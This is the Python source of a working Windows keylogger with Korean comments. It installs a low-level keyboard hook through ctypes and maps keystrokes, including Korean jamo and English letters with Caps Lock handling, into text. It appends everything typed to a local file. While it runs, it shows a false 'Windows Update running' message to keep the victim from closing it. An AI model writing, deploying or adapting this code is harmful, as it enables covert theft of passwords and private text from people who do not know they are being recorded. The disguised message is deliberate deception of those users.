#-*- coding: utf-8 -*-
import sys
from ctypes import *
from ctypes.wintypes import MSG 
from ctypes.wintypes import DWORD

user32=windll.user32
kernel32=windll.kernel32
WH_KEYBOARD_LL=13
WM_KEYDOWN=0x0100
korEng=False
capLock=False
log="e:\\test.txt"

class KeyLogger: # 후킹 설정(SetWindowsHookExA), 해제(UnhookWindowsHookEx)하는 함수
    def __init__(self):
        self.lUser32=user32
        self.hooked=None
    def installHookProc(self, pointer):
        self.hooked=self.lUser32.SetWindowsHookExA(WH_KEYBOARD_LL, pointer, kernel32.GetModuleHandleW(None), 0)
        if not self.hooked:
            return False
        return True
    def uninstallHookProc(self): 
        if self.hooked is None: 
            return
        self.lUser32.UnhookWindowsHookEx(self.hooked)
        self.hooked=None

def getFPTR(fn): # 훅 프로시저에 함수 포인터를 전달하기 위한 함수로 ctypes 를 이용
    CMPFUNC=CFUNCTYPE(c_int, c_int, c_int, POINTER(c_void_p)) 
    return CMPFUNC(fn)

def hookProc(nCode, wParam, lParam):  # 훅 프로시저
    if wParam is not WM_KEYDOWN:
        return user32.CallNextHookEx(keyLogger.hooked, nCode, wParam, lParam)
    #print lParam[0]
    #hookedKey=chr(lParam[0])
    fp=open(log, "a")
    fp.write(baseLog(int(lParam[0])))
    fp.close()
    hookedKey=""
    return user32.CallNextHookEx(keyLogger.hooked, nCode, wParam, lParam)

def startKeyLog(): 
    msg=MSG()
    user32.GetMessageA(byref(msg),0,0,0) # 큐를 모니터링하고있다가 메세지가 들어오면 메세지를 프로시저로 전달하는 함수
    
def baseLog(keyNum):
    global korEng
    global capLock  
    if(keyNum==27 or keyNum==112 or keyNum==113 or keyNum==114 or
       keyNum==115 or keyNum==116 or keyNum==117 or keyNum==118 or
       keyNum==119 or keyNum==120 or keyNum==121 or keyNum==122 or
       keyNum==123 or keyNum==44 or keyNum==145 or keyNum==45 or
       keyNum==44 or keyNum==45 or keyNum==36 or keyNum==33 or
       keyNum==34 or keyNum==35 or keyNum==144 or keyNum==162 or
       keyNum==91 or keyNum==25 or keyNum==162 or keyNum==92 or
       keyNum==93 or keyNum==25 or keyNum==38 or keyNum==40): return ''
    elif keyNum==9: return "[Tab]"
    elif keyNum==46: return "[Delete]"
    elif keyNum==37: return "[Left]"
    elif keyNum==39: return "[Right]"
    elif keyNum==13: return "[Enter]"
    elif keyNum==160 or keyNum==161: return "[Shift]"
    elif keyNum==21: # 한/영
        if korEng==False:
            korEng=True
        elif korEng==True:
            korEng=False
    elif keyNum==20: # Caps Lock
        if capLock==False:
            capLock=True
        elif capLock==True:
            capLock=False
    elif keyNum==96: return "0"        
    elif keyNum==97: return "1"
    elif keyNum==98: return "2"
    elif keyNum==99: return "3"
    elif keyNum==100: return "4"
    elif keyNum==101: return "5"
    elif keyNum==102: return "6"
    elif keyNum==103: return "7"
    elif keyNum==104: return "8"
    elif keyNum==105: return "9"
    elif keyNum==110: return "."
    elif keyNum==107: return "+"
    elif keyNum==109: return "-"
    elif keyNum==106: return "*"
    elif keyNum==111: return "/"
    elif keyNum==8: return "[BackSpace]"
    elif keyNum==32: return " "
    if korEng: # 한국어
        if(keyNum==192): return "`"
        elif(keyNum==49): return "1"
        elif(keyNum==50): return "2"
        elif(keyNum==51): return "3" 
        elif(keyNum==52): return "4" 
        elif(keyNum==53): return "5"
        elif(keyNum==54): return "6" 
        elif(keyNum==55): return "7" 
        elif(keyNum==56): return "8" 
        elif(keyNum==57): return "9"
        elif(keyNum==48): return "0" 
        elif(keyNum==189): return "-" 
        elif(keyNum==187): return "=" 
        elif(keyNum==220): return "\\" 
        elif(keyNum==81): return "ㅂ" 
        elif(keyNum==87): return "ㅈ" 
        elif(keyNum==69): return "ㄷ" 
        elif(keyNum==82): return "ㄱ" 
        elif(keyNum==84): return "ㅅ" 
        elif(keyNum==89): return "ㅛ" 
        elif(keyNum==85): return "ㅕ" 
        elif(keyNum==73): return "ㅑ"
        elif(keyNum==79): return "ㅐ"
        elif(keyNum==80): return "ㅔ" 
        elif(keyNum==219): return "["
        elif(keyNum==221): return "]" 
        elif(keyNum==65): return "ㅁ"
        elif(keyNum==83): return "ㄴ" 
        elif(keyNum==68): return "ㅇ" 
        elif(keyNum==70): return "ㄹ" 
        elif(keyNum==71): return "ㅎ" 
        elif(keyNum==72): return "ㅗ" 
        elif(keyNum==74): return "ㅓ" 
        elif(keyNum==75): return "ㅏ" 
        elif(keyNum==76): return "ㅣ" 
        elif(keyNum==186): return ";" 
        elif(keyNum==222): return "'"
        elif(keyNum==90): return "ㅋ" 
        elif(keyNum==88): return "ㅌ"
        elif(keyNum==67): return "ㅊ" 
        elif(keyNum==86): return "ㅍ" 
        elif(keyNum==66): return "ㅠ" 
        elif(keyNum==78): return "ㅜ" 
        elif(keyNum==77): return "ㅡ" 
        elif(keyNum==188): return "," 
        elif(keyNum==190): return "." 
        elif(keyNum==191): return "/" 
    else: # 영어
        if capLock: # Caps Lock ON
            if(keyNum==192): return "`"
            elif(keyNum==49): return "1"
            elif(keyNum==50): return "2"
            elif(keyNum==51): return "3" 
            elif(keyNum==52): return "4" 
            elif(keyNum==53): return "5"
            elif(keyNum==54): return "6" 
            elif(keyNum==55): return "7" 
            elif(keyNum==56): return "8" 
            elif(keyNum==57): return "9"
            elif(keyNum==48): return "0" 
            elif(keyNum==189): return "-" 
            elif(keyNum==187): return "=" 
            elif(keyNum==220): return "\\" 
            elif(keyNum==81): return "Q" 
            elif(keyNum==87): return "W" 
            elif(keyNum==69): return "E" 
            elif(keyNum==82): return "R" 
            elif(keyNum==84): return "T" 
            elif(keyNum==89): return "Y" 
            elif(keyNum==85): return "U" 
            elif(keyNum==73): return "I"
            elif(keyNum==79): return "O"
            elif(keyNum==80): return "P" 
            elif(keyNum==219): return "["
            elif(keyNum==221): return "]" 
            elif(keyNum==65): return "A"
            elif(keyNum==83): return "S" 
            elif(keyNum==68): return "D" 
            elif(keyNum==70): return "F" 
            elif(keyNum==71): return "G" 
            elif(keyNum==72): return "H" 
            elif(keyNum==74): return "J" 
            elif(keyNum==75): return "K" 
            elif(keyNum==76): return "L" 
            elif(keyNum==186): return ";" 
            elif(keyNum==222): return "'" 
            elif(keyNum==90): return "Z" 
            elif(keyNum==88): return "X"
            elif(keyNum==67): return "C" 
            elif(keyNum==86): return "V" 
            elif(keyNum==66): return "B" 
            elif(keyNum==78): return "N" 
            elif(keyNum==77): return "M" 
            elif(keyNum==188): return "," 
            elif(keyNum==190): return "." 
            elif(keyNum==191): return "/" 
        else: # Caps Lock OFF
            if(keyNum==192): return "`" 
            elif(keyNum==49): return "1"
            elif(keyNum==50): return "2"
            elif(keyNum==51): return "3" 
            elif(keyNum==52): return "4" 
            elif(keyNum==53): return "5"
            elif(keyNum==54): return "6" 
            elif(keyNum==55): return "7" 
            elif(keyNum==56): return "8" 
            elif(keyNum==57): return "9"
            elif(keyNum==48): return "0" 
            elif(keyNum==189): return "-" 
            elif(keyNum==187): return "=" 
            elif(keyNum==220): return "\\" 
            elif(keyNum==81): return "q" 
            elif(keyNum==87): return "w" 
            elif(keyNum==69): return "e" 
            elif(keyNum==82): return "r" 
            elif(keyNum==84): return "t" 
            elif(keyNum==89): return "y" 
            elif(keyNum==85): return "u" 
            elif(keyNum==73): return "i"
            elif(keyNum==79): return "o"
            elif(keyNum==80): return "p" 
            elif(keyNum==219): return "["
            elif(keyNum==221): return "]" 
            elif(keyNum==65): return "a"
            elif(keyNum==83): return "s" 
            elif(keyNum==68): return "d" 
            elif(keyNum==70): return "f" 
            elif(keyNum==71): return "g" 
            elif(keyNum==72): return "h" 
            elif(keyNum==74): return "j" 
            elif(keyNum==75): return "k" 
            elif(keyNum==76): return "l" 
            elif(keyNum==186): return ";" 
            elif(keyNum==222): return "'"
            elif(keyNum==90): return "z" 
            elif(keyNum==88): return "x"
            elif(keyNum==67): return "c" 
            elif(keyNum==86): return "v" 
            elif(keyNum==66): return "b" 
            elif(keyNum==78): return "n" 
            elif(keyNum==77): return "m" 
            elif(keyNum==188): return "," 
            elif(keyNum==190): return "." 
            elif(keyNum==191): return "/" 
    return ""

def main():
    global keyLogger
    keyLogger=KeyLogger()
    pointer=getFPTR(hookProc) # 훅 체인에 콜백함수(훅 프로시저) 등록
    if keyLogger.installHookProc(pointer): # 후킹 시작 
        print "Windows Update running.\nPlease do not exit the terminal."
    startKeyLog()

if __name__=="__main__":
    main()